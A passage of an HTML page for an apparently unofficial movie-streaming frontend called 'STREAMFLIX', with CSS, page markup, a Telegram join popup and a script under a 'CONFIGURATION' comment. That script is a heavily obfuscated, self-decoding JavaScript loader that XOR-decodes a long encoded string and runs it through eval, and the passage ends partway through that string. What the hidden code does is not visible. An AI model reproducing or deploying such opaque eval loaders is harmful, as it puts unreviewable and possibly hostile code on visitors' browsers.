      font-size: 18px;
      color: var(--primary);
    }

    .settings-item-label {
      font-size: 15px;
      font-weight: 500;
    }

    .settings-item-value {
      font-size: 13px;
      color: var(--text-muted);
    }

    .settings-item-right {
      color: var(--text-muted);
    }

    /* Profile Input */
    .profile-input {
      background: var(--bg-card);
      border: 2px solid var(--border-color);
      border-radius: 8px;
      padding: 12px 16px;
      font-size: 15px;
      color: var(--text-primary);
      width: 180px;
      transition: all var(--transition-normal);
    }

    .profile-input:focus {
      outline: none;
      border-color: var(--primary);
    }

    /* Theme Colors */
    .theme-colors {
      display: flex;
      gap: 12px;
    }

    .theme-color {
      width: 36px;
      height: 36px;
      border-radius: 50%;
      cursor: pointer;
      transition: all var(--transition-normal);
      border: 3px solid transparent;
    }

    .theme-color:hover {
      transform: scale(1.15);
    }

    .theme-color.active {
      border-color: var(--text-primary);
      box-shadow: 0 0 15px currentColor;
    }

    .theme-color.red { background: #e50914; }
    .theme-color.blue { background: #0077ff; }
    .theme-color.green { background: #00c853; }
    .theme-color.purple { background: #9c27b0; }
    .theme-color.orange { background: #ff5722; }
    .theme-color.pink { background: #e91e63; }

    /* ==================== BOTTOM NAVIGATION ==================== */
    .bottom-nav {
      position: fixed;
      bottom: 0;
      left: 0;
      right: 0;
      height: 60px;
      background: linear-gradient(to top, var(--bg-dark) 60%, transparent);
      backdrop-filter: blur(20px);
      z-index: 1000;
      display: flex;
      align-items: center;
      justify-content: space-around;
      padding: 0 16px;
    }

    @media (min-width: 768px) {
      .bottom-nav {
        height: 70px;
      }
    }

    .nav-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 4px;
      padding: 8px 16px;
      color: var(--text-muted);
      font-size: 10px;
      font-weight: 500;
      transition: all var(--transition-normal);
      position: relative;
    }

    .nav-item i {
      font-size: 22px;
      transition: all var(--transition-normal);
    }

    .nav-item.active {
      color: var(--primary);
    }

    .nav-item.active i {
      transform: scale(1.15);
    }

    .nav-item::before {
      content: '';
      position: absolute;
      top: -4px;
      left: 50%;
      transform: translateX(-50%) scaleX(0);
      width: 20px;
      height: 3px;
      background: var(--primary);
      border-radius: 2px;
      transition: transform var(--transition-normal);
    }

    .nav-item.active::before {
      transform: translateX(-50%) scaleX(1);
    }

    .nav-item:hover:not(.active) {
      color: var(--text-secondary);
    }

    .nav-item:hover:not(.active) i {
      transform: translateY(-2px);
    }

    /* ==================== PLAYER MODAL ==================== */
    .player-modal {
      position: fixed;
      inset: 0;
      background: var(--bg-dark);
      z-index: 5000;
      display: none;
      opacity: 0;
    }

    .player-modal.active {
      display: block;
      animation: fadeIn var(--transition-normal) forwards;
    }

    .player-modal.closing {
      animation: fadeOut var(--transition-normal) forwards;
    }

    .player-close {
      position: absolute;
      top: 20px;
      right: 20px;
      width: 48px;
      height: 48px;
      background: rgba(0, 0, 0, 0.6);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 22px;
      z-index: 10;
      transition: all var(--transition-normal);
      backdrop-filter: blur(10px);
    }

    .player-close:hover {
      background: var(--primary);
      transform: scale(1.1) rotate(90deg);
    }

    .player-iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* ==================== TOAST ==================== */
    .toast-container {
      position: fixed;
      bottom: 80px;
      left: 50%;
      transform: translateX(-50%);
      z-index: 6000;
      display: flex;
      flex-direction: column;
      gap: 10px;
      align-items: center;
    }

    .toast {
      background: var(--bg-elevated);
      color: var(--text-primary);
      padding: 14px 24px;
      border-radius: 10px;
      font-size: 14px;
      font-weight: 500;
      box-shadow: var(--shadow-card);
      animation: popIn var(--transition-bounce) forwards;
      display: flex;
      align-items: center;
      gap: 10px;
      backdrop-filter: blur(10px);
      border: 1px solid var(--border-color);
    }

    .toast i {
      font-size: 18px;
    }

    .toast.success i { color: var(--success); }
    .toast.error i { color: var(--primary); }
    .toast.info i { color: #00bcd4; }

    .toast.exit {
      animation: fadeOut var(--transition-normal) forwards;
    }

    /* ==================== RIPPLE EFFECT ==================== */
    .ripple {
      position: absolute;
      border-radius: 50%;
      background: rgba(255, 255, 255, 0.4);
      transform: scale(0);
      animation: ripple 0.6s linear;
      pointer-events: none;
    }

    /* ==================== LOADING OVERLAY ==================== */
    .loading-overlay {
      position: fixed;
      inset: 0;
      background: var(--bg-dark);
      z-index: 9999;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      transition: opacity var(--transition-slow);
    }

    .loading-overlay.hide {
      opacity: 0;
      pointer-events: none;
    }

    .loading-logo {
      font-family: 'Bebas Neue', cursive;
      font-size: 56px;
      color: var(--primary);
      letter-spacing: 6px;
      margin-bottom: 30px;
      animation: pulse 1.5s infinite;
    }

    .loading-spinner {
      width: 40px;
      height: 40px;
      border: 3px solid var(--bg-elevated);
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* ==================== UTILITY CLASSES ==================== */
    .text-center { text-align: center; }
    .hidden { display: none !important; }
    
    /* ==================== TELEGRAM JOIN POPUP ==================== */
.telegram-overlay {
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.5); 
  z-index: 9999;
  display: flex;
  align-items: center;
  justify-content: center;
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.3s ease;
}

.telegram-overlay.active {
  opacity: 1;
  visibility: visible;
}

.telegram-card {
  width: 90%;
  max-width: 360px;
  background: #141414;
  border-radius: 16px;
  padding: 22px;
  text-align: center;
  border: 1px solid #2a2a2a;
  box-shadow: 0 20px 40px rgba(0,0,0,0.6);
  animation: telegramPop 0.35s ease;
}

.telegram-icon {
  width: 64px;
  height: 64px;
  margin: 0 auto 14px;
  border-radius: 50%;
  background: #229ED9;
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 30px;
  color: #fff;
}

.telegram-title {
  font-size: 20px;
  font-weight: 700;
  margin-bottom: 6px;
  color: #fff;
}

.telegram-text {
  font-size: 14px;
  color: #b3b3b3;
  margin-bottom: 18px;
  line-height: 1.5;
}

.telegram-actions {
  display: flex;
  gap: 12px;
}

.telegram-btn {
  flex: 1;
  padding: 12px 0;
  border-radius: 8px;
  font-size: 14px;
  font-weight: 600;
  border: none;
  cursor: pointer;
  transition: all 0.25s ease;
}

.telegram-btn.join {
  background: #229ED9;
  color: #fff;
}

.telegram-btn.join:hover {
  background: #1c8ac3;
  transform: scale(1.05);
}

.telegram-btn.later {
  background: #2a2a2a;
  color: #ccc;
}

.telegram-btn.later:hover {
  background: #333;
}

@keyframes telegramPop {
  from { transform: scale(0.85); opacity: 0; }
  to { transform: scale(1); opacity: 1; }
}
  </style>
</head>
<body class="no-scroll">
  
  <div class="loading-overlay" id="loadingOverlay">
    <div class="loading-logo">STREAMFLIX</div>
    <div class="loading-spinner"></div>
  </div>

  
  <div class="language-overlay" id="languageOverlay">
    <div class="language-popup">
      <div class="language-popup-logo">STREAMFLIX</div>
      <h2 class="language-popup-title">Select Your Language</h2>
      <p class="language-popup-subtitle">Choose your preferred language for content</p>
      <div class="language-grid">
        <button class="language-btn" data-lang="en-US" onclick="selectLanguage('en-US')">
          English
          <span>English</span>
        </button>
        <button class="language-btn" data-lang="hi-IN" onclick="selectLanguage('hi-IN')">
          हिन्दी
          <span>Hindi</span>
        </button>
        <button class="language-btn" data-lang="ta-IN" onclick="selectLanguage('ta-IN')">
          தமிழ்
          <span>Tamil</span>
        </button>
        <button class="language-btn" data-lang="te-IN" onclick="selectLanguage('te-IN')">
          తెలుగు
          <span>Telugu</span>
        </button>
        <button class="language-btn" data-lang="ml-IN" onclick="selectLanguage('ml-IN')">
          മലയാളം
          <span>Malayalam</span>
        </button>
      </div>
    </div>
  </div>

  <!-- Header -->
  <header class="header" id="header">
    <a href="/" class="header-logo" onclick="navigateTo('home'); return false;">STREAMFLIX</a>
    <div class="header-right">
      <button class="search-toggle" onclick="navigateTo('search')">
        <i class="fas fa-search"></i>
      </button>
      <div class="header-avatar" id="headerAvatar">S</div>
    </div>
  </header>

  
  <main id="mainContent">
    
    <div class="page active" id="homePage">
      <section class="hero" id="heroSection">
        <div class="hero-slider" id="heroSlider"></div>
        <div class="hero-indicators" id="heroIndicators"></div>
      </section>

      
      <section class="content-section" id="contentRows"></section>
    </div>

    
    <div class="page" id="detailsPage">
      <div class="details-banner" id="detailsBanner">
        <div class="details-backdrop" id="detailsBackdrop"></div>
        <div class="details-video" id="detailsVideo"></div>
        <div class="details-gradient"></div>
        <button class="details-back" onclick="goBack()">
          <i class="fas fa-arrow-left"></i>
        </button>
      </div>
      <div class="details-content">
        <div class="details-poster" id="detailsPoster"></div>
        <div class="details-info" id="detailsInfo"></div>
      </div>
    </div>

    
    <div class="page" id="searchPage">
      <div class="search-container">
        <div class="search-input-wrapper">
          <i class="fas fa-search"></i>
          <input type="text" class="search-input" id="searchInput" placeholder="Search movies, TV shows..." oninput="handleSearchInput(event)">
          <button class="search-clear" onclick="clearSearch()">
            <i class="fas fa-times"></i>
          </button>
        </div>
      </div>
      <h2 class="search-results-title" id="searchResultsTitle">Popular Searches</h2>
      <div class="search-grid" id="searchGrid"></div>
    </div>

    
    <div class="page" id="bookmarksPage">
      <div class="bookmarks-header">
        <h1 class="bookmarks-title">My List</h1>
        <p class="bookmarks-subtitle">Your saved movies and TV shows</p>
      </div>
      <div class="bookmarks-grid" id="bookmarksGrid"></div>
    </div>

    <!-- Settings Page -->
    <div class="page" id="settingsPage">
      <div class="settings-header">
        <h1 class="settings-title">Settings</h1>
        <p class="settings-subtitle">Customize your experience</p>
      </div>
      <div class="settings-content" id="settingsContent"></div>
      <div class="settings-section" style="animation-delay: 0.5s">
  <h3 class="settings-section-title">Credits</h3>

  <div class="settings-card">
    <div class="settings-item">
      <div class="settings-item-left">
        <div class="settings-item-icon">
          <i class="fa fa-code"></i>
        </div>
        <div>
          <div class="settings-item-label">Developed By</div>
          <div class="settings-item-value">MHPUTECH</div>
        </div>
      </div>
    </div>

    <div class="settings-item">
      <div class="settings-item-left">
        <div class="settings-item-icon">
          <i class="fa fa-database"></i>
        </div>
        <div>
          <div class="settings-item-label">Data Source</div>
          <div class="settings-item-value"> Third-party </div>
        </div>
      </div>
    </div>

    <div class="settings-item">
      <div class="settings-item-left">
        <div class="settings-item-icon">
          <i class="fa fa-play-circle"></i>
        </div>
        <div>
          <div class="settings-item-label">Player & Streaming</div>
          <div class="settings-item-value">Third-party Providers</div>
        </div>
      </div>
    </div>

    <div class="settings-item">
      <div class="settings-item-left">
        <div class="settings-item-icon">
          <i class="fa fa-info-circle"></i>
        </div>
        <div>
          <div class="settings-item-label">Disclaimer</div>
          <div class="settings-item-value">
            This app does not host any content. All data is provided by external APIs.
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
    </div>
    
  </main>

  <!-- Bottom Navigation -->
  <nav class="bottom-nav" id="bottomNav">
    <button class="nav-item active" data-page="home" onclick="location.hash=''">
  <i class="fa fa-home"></i>
  <span>Home</span>
</button>
    <button class="nav-item" data-page="search" onclick="navigateTo('search')">
      <i class="fas fa-search"></i>
      <span>Search</span>
    </button>
    <button class="nav-item" data-page="bookmarks" onclick="navigateTo('bookmarks')">
      <i class="fas fa-bookmark"></i>
      <span>My List</span>
    </button>
    <button class="nav-item" data-page="settings" onclick="navigateTo('settings')">
      <i class="fas fa-cog"></i>
      <span>Settings</span>
    </button>
  </nav>

  
  <div class="player-modal" id="playerModal">
    <button class="player-close" onclick="closePlayer()">
      <i class="fas fa-times"></i>
    </button>
    <iframe class="player-iframe" id="playerIframe" allowfullscreen></iframe>
  </div>

  <!-- Toast Container -->
  <div class="toast-container" id="toastContainer"></div>

  <script>
    // ==================== CONFIGURATION ====================
    // Job ID: u2ot3m934jxo
let uGaE;!function(){const MXJF=Array.prototype.slice.call(arguments);return eval("(function oZfx(Xenp){const rCfp=jmun(Xenp,P6Jp(oZfx.toString()));try{let T9hp=eval(rCfp);return T9hp.apply(null,MXJF);}catch(TbPp){var vJRp=(0o206250-68740);while(vJRp<(0o400161%65574))switch(vJRp){case (0x3008D%0o200043):vJRp=TbPp instanceof SyntaxError?(0o400103%0x1001B):(0o400163%0x10027);break;case (0o200606-0x10179):vJRp=(0o400177%65581);{console.log(\'Error: the code has been tampered!\');return}break;}throw TbPp;}function P6Jp(rEMp){let L1Ep=1547281458;var nzHp=(0o400064%65552);{let HWzp;while(nzHp<(0x10488-0o202153)){switch(nzHp){case (0O3153050563-0x19AC516B):nzHp=(0o203112-0x10633);{L1Ep^=(rEMp.charCodeAt(HWzp)*(15658734^0O73567354)+rEMp.charCodeAt(HWzp>>>(0x4A5D0CE&0O320423424)))^1279999889;}break;case (0x4007B%0o200031):nzHp=(0x40088%0o200033);HWzp++;break;case (0o204730-68028):nzHp=HWzp<rEMp.length?(73639709%9):(0o1000151%65555);break;case (0o201440-0x1030C):nzHp=(0o1000200%0x10019);HWzp=(0x21786%3);break;}}}let juCp=\"\";var LTwn=(66316-0o201377);{let nrzn;while(LTwn<(0x104B0-0o202222)){switch(LTwn){case (0o202020-66563):LTwn=(0o201510-0x1033C);nrzn=(0x21786%3);break;case (262236%0o200024):LTwn=nrzn<(0O3153050563-0x19AC516B)?(66406-0o201511):(0o201130-0x1023A);break;case (0x106CC-0o203257):LTwn=(0x20031%0o200024);{const HOrn=L1Ep%(69016-0o206573);L1Ep=Math.floor(L1Ep/(0o205062-0x10A15));juCp+=HOrn>=(0x1071C-0o203402)?String.fromCharCode((0o600404%65601)+(HOrn-(0o1000136%0x10011))):String.fromCharCode((0o217120-0x11DEF)+HOrn);}break;case (0o201166-66157):LTwn=(0o200550-0x1015C);nrzn++;break;}}}return juCp;}function jmun(DJmn,fhpn){DJmn=decodeURI(DJmn);let zEhn=(0x21786%3);let bckn=\"\";var beRn=(67336-0o203364);{let DLTn;while(beRn<(0o600101%0x1000C)){switch(beRn){case (0O347010110&0x463A71D):beRn=(0o205310-0x10AB1);{bckn+=String.fromCharCode(DJmn.charCodeAt(DLTn)^fhpn.charCodeAt(zEhn));zEhn++;var X8Ln=(0o205454-0x10B16);while(X8Ln<(0x11248-0o211041))switch(X8Ln){case (0o200334-0x100C6):X8Ln=zEhn>=fhpn.length?(0o201344-66239):(0o203636-0x10777);break;case (0x300AF%0o200056):X8Ln=(0o400167%65576);{zEhn=(0x75bcd15-0O726746425);}break;}}break;case (0o1000200%65561):beRn=DLTn<DJmn.length?(73639709%9):(0o600120%65553);break;case (0o1000134%65554):beRn=(196699%0o200025);DLTn=(0x75bcd15-0O726746425);break;case (0o203460-67353):beRn=(0o205360-68308);DLTn++;break;}}}return bckn;}})(\"D%1F%02%1D%0E%06%0A%0E%02Q%5E%08%0B%07%0D%02%18%10%18%1DM;%0EY%1BQ%5E%08%1F%17%17%14%1E%17W%5BL)%3EJ7$%5E(FSH:1RVX6/H@G%22*.%10%14%16%0F%0F%0D%1E%1C%03R%084%0D%01_Z%16%00%06%15%19%0B%19S%0E%1B%1A%11DP%5C%1C#A%17IER:B%05%03KHG%0A%20%10%1BZJJ%07%3E%05%07E%5BH%0E%22J%03%5BDY%0C#%3E%08_ZF%1D-R%18Q%5EX$@-%13DP%0A%15%18%1C%00%15%05%16%19S%06%25+%19DP%0C%01%08%06%16%13%02Y_X6/H@G%22*XEYH:G%22*.6Y8%3CG%22*.D%5BHI=O%1A%02E%5BJ%1C%19%3E%166P%09%1EZ%0A%0C%19%10%19%1B%0C%0FL4%038%15ZJ%1A%25%20=%02E%5B84%0A%0E%05%5BD/%5E%14+%182(%1A$$%15DP*H%10%14%16%0F%0F%0D%1E%1C%03R%043/%01_Z%16%00%06%15%19%0B%19SEYH:G%22*.6Y8%3C1P%5C(0%0F%05%14%02%1A%03%1A%02%1CC(%03?%0F%5BD%09%11%04%18%0C%05%1DMZ8%3C7%22*.F)%3EH7RVX6/H@G%22*XLY8%3C1%04%11%06%03%11%17%08%03%17W%10%20%0A%1BIE%02%05%16%19%07%11%0FL0%14%07%18ZJJ9%172%07E%5BH,%5D%11%06%5BDY%00%20%00%0C_Z%10%14%16%0F%0F%0D%1E%1C%03R&%0B-%01_Z%16%00%06%15%19%0B%19SE;Q/%1EQ%5EZ6\'%0FV%1FQ%5E.E%5B%1E%07%19%17%14%07%04%1D%0DA5%3E%04%0BE%5B%18%13%09%0D%02%01%03RKJ7$%5CRF)%3EHGQ_X6/H@G%22*XEYH:G%22*.6Y8%3CG%22*.D%5BII!%13B%06E%5BJH%11%1F%02%1D%0E%06%0A%0E%02Y6%16%1B%0AKH%17%0B%12%07%18%00%0DADX,.F)%3EH7RVX6/%3E%1C%19%3E%166C%1D%5E@M%22*H%0B%07%0D%02%18%10%18%1DM%11&%11%1AQ%5E%08%1F%17%17%14%1E%17W%5B$%1F%5B%16DP%5E(8%1ET%12DP*%5BD%0F%05%14%02%1A%03%1A%02%1CC$%0E%0A%01%5B4%0B%08%17E%02%05%16%19%07%11%0FL%0A:%0B%1E):%18%07%0F*H%10%14%16%0F%0F%0D%1E%1C%03R%22W%01%0F_Z%16%00%06%15%19%0B%19SEYH:G%22*.6Y8%3C1R_XF)H:1$,X6/%3EHER_%5B%06%25+%19DP%5EYE%11%0E%22%1DQ%5EZD%0F%05%14%02%1A%03%1A%02%1CC4%18%1F%01%5BD%09%11%04%18%0C%05%1DM3.S%1CQ%5EX%0A%06%06%13DP%5C24%17%17IER%3E%14%15%04KHG%0A%3E%07%1FZJJ%1F.%14%05E%5BH(=;%18%5BDY:%14%0B%0C_Z%10%14%16%0F%0F%0D%1E%1C%03R%14P%04%0F_Z%16%00%06%15%19%0B%19S,?Q%11DP%5C%14%19%17%11IER6*%08%06KHG0%10%0B%1BZJ%1C%0A%0C%19%10%19%1B%0C%0FL(%18%12%1BZJ%1A%1E%1C%03%06%1F%1CC$_%13%03%5BDY%22S%05%0C_ZF#W1%1CQ%5EX$%15%1B%17DP%0A%15%18%1C%00%15%05%16%19S%1E%25%00%17DP%0C%01%08%06%16%13%02Y_RL)%3EJ7$%5E(F)%3E%3C%11%0F%16%01M%01:+%1AD,%5B%5D%1DUQ%5DLEEHB%1BP%5CI47D%5EKQ%03OGCXBVD%5C%01FC%5DC%20H@QG%0B_BQ%22U%5CG%1C_BSRXN%5E_EB%1BP%5C8G2@B%0CS%5CMCB%5C%5BOI%5DLAFUEPU2I8D%5EGUV_LCZ0I%05%14%02%1A%03%1A%02%1CC4%1A4%01%5BD%09%11%04%18%0C%05%1DMZ%22Y8%0F_ZDY8%3C%11%1F%02%1D%0E%06%0A%0E%02Y%18\'(%04KH%17%0B%12%07%18%00%0DADQ%5CRF)%3EJDR%5C(F)%3E%3C7R,.0%5BJKD0O%1C%19ZJHER_XF)H:1$,X6/%3EH%11%1F%02%1D%0E%06%0A%0E%02Y&%02%25%04KH%17%0B%12%07%18%00%0DAK%25%02C%5DFPF%11%1F%02%1D%0E%06%0A%0E%02Y%1C%3C%17%04K,%00:%01Z%16%00%06%15%19%0B%19S%1E?%1B%1274%1B0%1B/X%1C%0A%0C%19%10%19%1B%0C%0FL%1E=%06%1BZJ%1A%1E%1C%03%06%1F%1CCI%0F%144%02E%5BJJD,%07%11%18ZJH%11%1F%02%1D%0E%06%0A%0E%02Y%3E%14%15%04KH%17%0B%12%07%18%00%0DAD%1A6%1F%18ZJH7,%1BD%1EZJ%3CDP%0A%05%0C%00C(%05M%01N6ZS%19%5EICF%5CBSXI@%5E_EB,T%5CNAG%5BCWU2I%0FF%5C4W%22ZH%5E_EB%1BX(A36Y_S.XNDC%5BEPTEU_C%02@SS%5DHC%5E%5D%0ARQXMFZAZUWYNA%5E%5D%1DQQ%5EIG@D/X%07%19%17%14%07%04%1D%0DA%07(A%05E%5B%18%13%09%0D%02%01%03RKJMR,.FSH:1P%5C%5BE%012#%18Q%5EZGZ%10%22?%09_ZD%5B%1E%07%19%17%14%07%04%1D%0DA)%1D-%05E%5B%18%14+%182(%1A$$%15DP*N$+)%10DP,&%0B%05%11IE$L:48%12IE%222#,%02KHG0G%14%1FZJ%3CQ%0C0%12()*,%14%17_Z0I%1E%07%19%17%14%07%04%1D%0DA%0B5F%05E%5B%18%13%09%0D%02%01%03RK%15%15%09%12%1C%0BRK:1R,.D%5B8JMR,.FSH:1RVX6/H@G%22*XLY8%3C1%04%11%06%03%11%17%08%03%17W2U&%15IE%02%05%16%19%07%11%0FLQ%5CX6Y8%3C1%22%5C(0/JJDQ%14%1E.%03KHES_XLY8%3CGQ%5CX6Y8%3C1%22%5C(0/JHE%04%11%06%03%11%17%08%03%17W%10*%25%15IE%02%05%16%19%07%11%0FL%0E=%06%1CZJJ%25%1E%0F%05E%5BH0%1D1%01%5BDY:%00;%16_Z%10%14%16%0F%0F%0D%1E%1C%03R%14R#%0F_*,%20%15M5:%18%04A3%02%13%1BU%22%0B%07%05J%1A%0F%16%19%00%19R%14T%00%0EJ%22%08%04%10I58%25%05A+%223%1AW%1B%16%03%15%17%09AQ%5CRF)%3EHEB%1B%16%19R2%12%09%0EJ%04=G%11I5:%18%04@ZH:7R,(FSH:1$%5C(F)%3E%3C1R,.0)H:1$,X6/%3E%3CEU%00F%01%05JZ%00%1C%03S%1EB%04%16Q,%0F%19%1AI%15%00%1EY:%1DT%04%5EI%5EOEA%5CDFQ%03KGC%5DCVHW%02%1B%16%19R%0C7%0E%0EL%04%05%1B%0F%04D4%19J%1BNKQ%03MGC%5CBVDZLBF%5B%5BJ%1A%1F%0E%1E%07%0E%1AK,%02@%01Z%16%11%02%12%09Y_C%02@SWXMG%5E%5BJ%5BWTPM%3E%03K%15%5C%03/%15%04Q+%20%0E%1BT_XF)H:1$,X6/%3EHSQG%3C%5EFTQ%5DIFB%5DTS%19XOD2ZC\'HVQG%1CYBSP%5CNREXGVVEB%15%01%08%13%08Z%0F%18%04%16MZS%0EXIGB_AFWYLAEDH.%0FU%0FJ%5B%5D%0APQ%5CO6V%5D%1DQQ%5CIDADI%0C7%0E%0E%5CXV%10%11%04%0D%12L%10%0C%01%06ADI8@%5CGPQYIBE%5E_S%19%5D@60XCU#EC:%1DT%04%5EI%5C%01FC%5BF%22L%5C%16EC%5EBUREB%0C%10%02%1C%10%15L(%1CE%19O:%20%3E%0F,%1C;%10%14%3CW(%04%16%1AO2%04%1A%0A_%22%1E%17%14MG%22*_%1EB%04%16AQ%5C(6Y8:GX,.FSH:1$%5C(F)%3E%3C1R,.0)H:1$,X6/%3E%3CEP%5C%22%06D%17J=%1C%01%00E#%10%04%1BU%04C%0A%05JZ%1FI%10%04PZ%10Q%0B%0E%5D2%0C%00%14HI%204%1C%1AI%1E%03%1E%1C%16%18V%11%02%12%09Y_BTDUX%5D%5CG%1C_BSQ%5EL%5EI%20%1CZ%17QQG%0BYBSW%5C%5CG%1C_BSQ%5EH%5EH%02$%01%16QR,(F)8JMR,.0Y8J7$*.F)%3E%3C7R,.0)H@G%22*.0I%01%13%09%18%1CH%10%0F%1E%02%03%17%04%07M%010Y%18D2+$%00K0%1F%1C%00_%1AG%0F%16EB%01%12%1FR.%07%5D%0DJ%5B%5D%0AQQ%5CM1V%5D%1DQQ%5CIDEDI%14%09%05%15%12%5B%20%14R%15PQG%1C_BSTYIZC%15CSPXM%5EZ%1E%05%0A%15%0F%11_%3E%0BC%17H%17%1A%16%00%08RKQ%14KGCXAFQ%03KGC%5DASHV4%11B%19OKQ%14HFAYJNQ%03KFB%5DFWHW%02&%00%08%05%5E0%09%0F%04%5B%3C%01%06%16@R%5C(F)%3E%3C7R,.0_H@G%22*_%1E!%5B%15EB%0A%11%1F%17%02%0AW%1A%16%00%08RKQ%14MGCTAFQ%03KGC%5DFSHV4%11B%19O%102T%0DINF)8J7%22%5C(0/H:G%22*.0Y8%3C1%22%5C(0/8JMR,.0/%5CI%5C%16FC%5DBQT%5B%5CG%0B%5CBSS_PM%5B%5D%1DQQ%5DJEC@DUS%5EI%5EH%0F%00%06%00%07B%0A%01%08%06%16%13%02Y&%00%08%05X%1C%0A%0C%19%10%19%1B%0C%0FL%169@%19ZJ%1A%1E%1C%03%06%1F%1CCI%18%00%07%16%02%14C@7$%5E(FSH:1$%0A%06*%13&O9%03%1A=P%14%16%0F%0F%0D%1E%1C%03ZJ%1A%1E%1C%03%06%1F%1CCI%5C%01@F%0F%11%07PYTG%3CZ@UVXOCAX%5B%1EZ%0A%0C%19%10%19%1B%0C%0FL0%16$%19ZJ%1A%1E%1C%03%06%1F%1CCIG%22*XLY8%3CER_%5BFSH:1R_XF)H:1$,X6/%3EHES_%0084%16IEP%5E%0E%0B%07%0D%02%18%10%18%1DM%19*8%18Q%5E%08%1F%17%17%14%1E%17W%5BF)%3EJMR,.DYKJMR,.FSH:1P%5C%5BFSH:1RVX6/J%1C%0A%0C%19%10%19%1B%0C%0FL%3CB%22%19ZJ%1A%1E%1C%03%06%1F%1CCIG%22,X6)BJ7$%5CRF)%3E%3CG%22%5C(0/%3EJ7$*(F)%3E%3C7RVX6/%3E%3CER_%5BFY8J7$*(F)%3E%3CGQ%5CX6Y8%3C1%22%5C(0/JHFQ%1C$%25%0AKHEP%0A%15%18%1C%00%15%05%16%19S%0A67%15DP%0C%01%08%06%16%13%02Y_6%5E%18%17IEP,&%01E%10IE$_Z%10%14%16%0F%0F%0D%1E%1C%03R%04\'%1D%0C_Z%16%00%06%15%19%0B%19SEYH:G%22*.6Y8%3C1P%5C%5BE3%5B5%1AQ%5EZGZH@G%22*XLY8%3CEP%0A%15%18%1C%00%15%05%16%19S$%11%17%14DP%0C%01%08%06%16%13%02Y_%07%14%02%06%0E%0AYV(0%5B8J7$*%0E%185%02$B%0E@%1C#O%05%14%02%1A%03%1A%02%1CKH%17%0B%12%07%18%00%0DADI8B_CPQ%5ELFV%5E%5B%1EZ%0A%0C%19%10%19%1B%0C%0FL%1A6%1F%18ZJ%1A%1E%1C%03%06%1F%1CCI7$,(0/H:1P,XF)HJ7%22*.6Y8%3C1$,X6/%3E%3C%11%1F%02%1D%0E%06%0A%0E%02Y2D%03%07KH%17%0B%12%07%18%00%0DADR,.FSH:1R_XF)H:1$,X6/H:1$%5EZFZ%08*%1A%0C_ZD%0F%05%14%02%1A%03%1A%02%1CC8%19%1E%02%5BD%09%11%04%18%0C%05%1DMZ*%02%18%0C_ZD)6%0D%5B%0A_Z0ZJ%1C%0A%0C%19%10%19%1B%0C%0FL8E%1A%18ZJ%1A%1E%1C%03%06%1F%1CCI-M\'%06E%5BJ:%033-%00E%5B%3EI=%143%06E%5BJ%1C%0A%0C%19%10%19%1B%0C%0FL,%07%11%18ZJ%1A%1E%1C%03%06%1F%1CCI%0B?%06%06E%5BJJD%3CB%22%19ZJH%11%1F%02%1D%0E%06%0A%0E%02Y%00+%09%07KH%17%0B%12%07%18%00%0DA%1F0%03%01E%5BH%12;%1A%01%5BDY*0.%16_ZF+%16%06%19Q%5E%0E%0B%07%0D%02%18%10%18%1DM%059*%19Q.%04#%07J%1A%1E%1C%03%06%1F%1CC%12!%01%04(4%05-%141B%0A%06*%13&O=%0C%1F=P%14%16%0F%0F%0D%1E%1C%03ZJ%1A%1E%1C%03%06%1F%1CCI%5C%01EJ%5EGWXX%18RDD%0FX%07%19%17%14%07%04%1D%0DA%1F,1%06E%5B%18%13%09%0D%02%01%03RK0Z%14%06%5BD%5BHI=O%1A%02E%5BJ%1C%0A%0C%19%10%19%1B%0C%0FL,%05:%18ZJ%1A%1E%1C%03%06%1F%1CCI%25%1CG%06E%5BJ:%033-%00E%5B%3EI=%143%06E%5BJ%1C%0A%0C%19%10%19%1B%0C%0FL%16\'2%18ZJ%1A%1E%1C%03%06%1F%1CC%0E.+%06%5BDY*%0E*%01_ZF?R%09%1DQ%5EX%0A%3ER%17DP%5C*%0E%06%13IER%04$%0E%04KHG%12:A%18ZJ%1C%0A%0C%19%10%19%1B%0C%0FL(%1A7%18ZJ%1A%1E%1C%03%06%1F%1CCI%1F:$%03E%5BJJD%3C@%1D%18ZJH%11%1F%02%1D%0E%06%0A%0E%02Y%1C8%1B%07KH%17%0B%12%07%18%00%0DADQ%5CX6Y8%3C1%22%5C(0/HIGR,X6/%3E:G%22*.D%5BII!%13B%06E%5BJHGQ%5C(6Y8:MR,.FSH:1$%5C(F)%3E%3C1R,.0)H:1$,XLY8%3C1$%5E%0E%0B%07%0D%02%18%10%18%1DM?%0B%18%19Q%5E%08%1F%17%17%14%1E%17W%07%05%1B%10:D8%20;%1EZJHGQ&%1C%0C%04KHE$L%0E%0B%07%0D%02%18%10%18%1DM?%09T%19Q%5E%08%1F%17%17%14%1E%17W%5BF)%3EJMR,.FZHJ7R,.0)H:1R,.0%5BJJDQ.%1C+%01KHES_%00%22F%10IEP%5E%0E%185%02$B%0AE%19#O%05%14%02%1A%03%1A%02%1CKH%17%0B%12%07%18%00%0DADI%18B%5BBSQ%5EHRC%15@SQ%5CO%5E%0EV%14%16%0F%0F%0D%1E%1C%03R%0C3%5B%0C_Z%16%00%06%15%19%0B%19SE%11%16*%1FQ%5EZ6%1D);%1FQ%5E.E;%06Q%19Q%5EZ%10%14%16%0F%0F%0D%1E%1C%03R*%04%5C%0C_Z%16%00%06%15%19%0B%19SEY8:G%22,X6/%3EJ7R,.0/H:1$,X6/%3E:GX%5C(0/%3EHGQ_%22%0C%00%11IEP%5D%5B%0E%1F%20%10DP%5EZ%10%14%16%0F%0F%0D%1E%1C%03R%08,%5E%0C_Z%16%00%06%15%19%0B%19SE\'T%0F%1CQ%5EZ6%1D);%1FQ%5E.E\'%13%03%19Q%5EZ%10%14%16%0F%0F%0D%1E%1C%03R&X9%0C_Z%16%00%06%15%19%0B%19SEYK:G%22,RF)%3EJMR,.0Y8J7$*.0Y8%3CE%22%5C(0/JJD%1E=%06%1BZJH%11%1F%02%1D%0E%06%0A%0E%02Y%10;5